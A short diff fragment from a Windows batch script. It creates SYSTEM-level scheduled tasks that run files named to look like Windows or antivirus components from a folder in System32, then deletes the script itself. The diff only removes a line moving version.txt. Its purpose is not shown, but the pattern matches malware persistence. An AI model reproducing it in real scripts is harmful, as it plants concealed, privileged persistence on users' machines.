@@ -37,7 +37,6 @@ SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.ex
 SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
 del NSudo.exe
-move "version.txt" "%systemroot%\System32\Windowsexe"
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
